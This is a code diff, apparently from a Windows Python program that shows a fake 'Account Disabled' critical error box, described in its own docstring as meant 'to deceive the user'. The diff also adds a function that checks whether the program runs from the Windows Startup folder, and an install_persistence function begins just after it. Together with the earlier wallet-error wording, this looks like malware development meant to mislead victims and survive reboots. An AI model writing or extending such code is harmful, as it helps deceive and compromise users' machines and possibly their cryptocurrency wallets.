@@ -14,13 +14,38 @@ def show_fake_error():
     Displays a fake error message box to deceive the user.
     Simulates the 'Failed to load wallet data' scenario.
     """
-    title = "Wallet Error"
-    message = "Failed to load wallet data. Corrupted file structure."
+    title = "Account Disabled"
+    message = "Account is no longer active."
     
     # ctypes.windll.user32.MessageBoxW is the Unicode version of the Win32 API
     #0:this pop-up is a standalone window and doesn't "belong" to any other program.
     #0x10: the "Critical Error" icon (Red X)
     ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
+
+def is_running_from_startup():
+    """
+    Checks if the current script/exe is running from the Windows Startup folder.
+    Returns: True if running from Startup, False otherwise.
+    """
+    try:
+        # Get current path
+        if getattr(sys, 'frozen', False):
+            current_file = sys.executable
+        else:
+            current_file = os.path.abspath(sys.argv[0])
+        
+        current_folder = os.path.dirname(current_file)
+        
+        # Get Startup path
+        startup_folder = os.path.join(
+            os.getenv('APPDATA'),
+            r'Microsoft\Windows\Start Menu\Programs\Startup'
+        )
+    
+        return os.path.normpath(current_folder).lower() == os.path.normpath(startup_folder).lower()
+        
+    except Exception:
+        return False
 
 def install_persistence():
     """
